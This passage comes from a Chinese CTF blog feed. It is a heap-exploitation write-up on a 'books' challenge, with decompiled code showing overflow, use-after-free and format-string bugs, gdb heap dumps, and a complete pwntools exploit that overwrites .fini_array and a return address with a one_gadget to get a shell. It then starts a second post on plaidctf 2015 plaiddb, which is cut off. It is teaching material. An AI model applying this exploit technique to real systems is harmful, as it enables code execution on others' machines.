= <span class="number">0</span>;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">'\n'</span> )<span class="comment">//关键点</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    idx = cnt++;</span><br><span class="line">    a1[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[cnt - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>漏洞点2(uaf)</li></ol><p>free后指针没置空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">delete_order</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1); <span class="comment">//重点</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>格式化字符串</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *first_order; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> *second_order; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  first_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  second_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !first_order || !second_order || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">" _____          _   _                 _          _                   _ \n"</span></span><br><span class="line">    <span class="string">"/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"</span></span><br><span class="line">    <span class="string">"  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"</span></span><br><span class="line">    <span class="string">" / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n"</span></span><br><span class="line">    <span class="string">" \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"</span></span><br><span class="line">    <span class="string">"Crappiest and most expensive books for your college education!\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"We can order books for you in case they're not in stock.\n"</span></span><br><span class="line">    <span class="string">"Max. two orders allowed!\n"</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</span><br><span class="line">        edit_order(first_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</span><br><span class="line">        edit_order(second_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        delete_order(first_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        delete_order(second_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, first_order, second_order);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-3-漏洞利用过程"><a href="#1-2-3-漏洞利用过程" class="headerlink" title="1.2.3. 漏洞利用过程"></a>1.2.3. 漏洞利用过程</h3><p>这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup<br>看了看雪大佬的文章才知道这题怎么利用的</p><p>开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的<strong>Your order is submitted!\n</strong>，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到</p><ol><li>开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x1b8d010-0x010</span><br><span class="line">0x1b8d000:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块1</span></span><br><span class="line">0x1b8d010:	0x0000000074736574	0x0000000000000000</span><br><span class="line">0x1b8d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d090:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块2，溢出修改处</span></span><br><span class="line">0x1b8d0a0:	0x0000000000000000	0x0000000000000000 <span class="comment">#数据部分</span></span><br><span class="line">0x1b8d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d120:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块3</span></span><br><span class="line">0x1b8d130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1b8d140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1b8d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x1b8d1c0:	0x696d627553203a35	0x20726564726f0a74</span><br><span class="line">0x1b8d1d0:	0x216465776f0a0a32	0x6163206e6920750a</span><br><span class="line">0x1b8d1e0:	0x2779656874206573	0x6920746f6e206572</span><br><span class="line">0x1b8d1f0:	0x2e6b636f7473206e	0x5f0a216e6f69740a</span><br><span class="line">0x1b8d200:	0x0a2020202f5c5f5f	0x0000000000000000</span><br><span class="line">0x1b8d210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d310:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><ol start="2"><li><p>编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1695028-0x28</span><br><span class="line">0x1695000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x1695010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x1695020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x1695030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x1695090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x16950a0:	0x00007f0e99412b00	0x00007f0e99412b78</span><br><span class="line">0x16950b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695120:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x1695130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1695140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1695150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></li><li><p>然后submit的时候具体会变成什么样呢?，会先复制<strong>Order 1: **，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的</strong>Order 1: **在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次</p></li><li><p>就是<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: **+chun1+’\n’</p></li><li><p>如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90</p></li><li><p>也就是说我们<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: *<em>这个的大小要为0x90，求出chunk大小，0x90-9</em>3-1=0x88-0x1c=0x74</p></li><li><p>所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了</p></li></ol><p>这是合并后的结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/56gx 0x6e6028-0x28</span><br><span class="line">0x6e6000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x6e6010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x6e6090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x6e60a0:	0x3a3120726564724f	0x2563373136322520</span><br><span class="line">0x6e60b0:	0x3325516e68243331	0x2438322550702431</span><br><span class="line">0x6e60c0:	0x6161616161616170	0x6161616161616161</span><br><span class="line">0x6e60d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6110:	0x6161616161616161	0x724f0a6161616161</span><br><span class="line">0x6e6120:	0x4f203a3220726564	0x203a312072656472</span><br><span class="line">0x6e6130:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6140:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e61a0:	0x64724f0a61616161	0x000a203a32207265</span><br><span class="line">0x6e61b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure><ol start="8"><li>既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9sdW9tdXhpYW94aWFvLmNvbS8/cD01MTY=" title="https://luomuxiaoxiao.com/?p=516">linux_x86程序启动中文版<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RicC1jb25zdWx0aW5nLmNvbS90dXRvcmlhbHMvZGVidWdnaW5nL2xpbnV4UHJvZ3JhbVN0YXJ0dXAuaHRtbA==" title="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">linux_x86程序启动英文版<i class="fa fa-external-link"></i></span><br>这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数</p><ol start="9"><li>这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了</li><li>所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了</li></ol><p>注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移</p><h3 id="1-2-4-exp"><a href="#1-2-4-exp" class="headerlink" title="1.2.4. exp"></a>1.2.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'books'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'books'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span> :</span></span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvregex(<span class="string">r'''Enter (.*?) order:\n'''</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span> :</span></span><br><span class="line">    p.sendline(str(idx+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(content)</span> :</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>+ <span class="string">'\x00'</span>*<span class="number">7</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_array = <span class="number">0x6011B8</span></span><br><span class="line">    main_addr = <span class="number">0x400A39</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#first step </span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hnQ%&#123;&#125;$pP%&#123;&#125;$p"</span>.format(<span class="number">0xA39</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">28</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    submit(p64(fini_array))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'Q'</span>)</span><br><span class="line">    __libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">    ret_addr = int(p.recv(<span class="number">15</span>)[<span class="number">1</span>:], <span class="number">16</span>)<span class="number">-0x1e8</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x45216</span> </span><br><span class="line">    <span class="comment">#one_gadget_offset = 0x4526a </span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf02a4</span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    p.success(<span class="string">"libc_base-&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    p.success(<span class="string">"ret_addr-&gt; 0x%x"</span> % ret_addr)</span><br><span class="line">    p.success(<span class="string">"one_gadget-&gt; 0x%x"</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second step</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    part1 = ((one_gadget&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span>)</span><br><span class="line">    part2 = (one_gadget &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    part =[</span><br><span class="line">        (part1, p64(ret_addr+<span class="number">2</span>)),</span><br><span class="line">        (part2, p64(ret_addr))</span><br><span class="line">    ]</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    size = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> part]</span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    print(size)</span><br><span class="line">    print(addr)</span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">0</span>], <span class="number">13</span>)</span><br><span class="line">    fmstr += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">1</span>]-size[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    submit(addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3. 总结"></a>1.3. 总结</h2><ol><li>这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块</li><li>其余部分就全是格式化字符串的利用了，没什么好讲的</li><li>这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的</li></ol><h2 id="1-4-参考链接"><a href="#1-4-参考链接" class="headerlink" title="1.4. 参考链接"></a>1.4. 参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY3ODMuaHRt" title="https://bbs.pediy.com/thread-246783.htm">看雪大佬的文章<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f4127a66/">https://noone-hub.github.io/posts/f4127a66/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程2</title>
    <url>/posts/83154af0/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程2"><a href="#pwn堆入门系列教程2" class="headerlink" title="pwn堆入门系列教程2"></a>pwn堆入门系列教程2</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">堆入门系列教程1<i class="fa fa-external-link"></i></span><br>序言：第二题，研究了两天，其中有小猪师傅，m4x师傅，萝卜师傅等各个师傅指点我，这次又踩了几个坑，相信以后不会再犯，第二题感觉比第一题复杂许多，不是off-by-one的问题，是这种攻击方式的问题，这种攻击方式十分精妙，chunk overlap，堆块重叠，这种攻击方式我也是第一次见，复现起来难度也是有滴</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="off-by-one第二题"><a href="#off-by-one第二题" class="headerlink" title="off-by-one第二题"></a>off-by-one第二题</h2><p>此题也是off-by-one里的一道题目，让我再次意识到off by one在堆里的强大之处</p><h2 id="plaidctf-2015-plaiddb"><a href="#plaidctf-2015-plaiddb" class="headerlink" title="plaidctf 2015 plaiddb"></a>plaidctf 2015 plaiddb</h2><p>前面的功能分析和数据结构分析我就不再做了，ctf-wiki上给的清楚了，然后网上各种wp也给的清楚了，我没逆向过红黑树，也没写过，所以具体结构我也不清楚，照着师傅们的来，确实是树</p><p>数据结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> data_size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="keyword">long</span> dummy;</span><br><span class="line">    <span class="keyword">long</span> dummy1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数存在off-by-one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = malloc_usable_size(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    v4 = 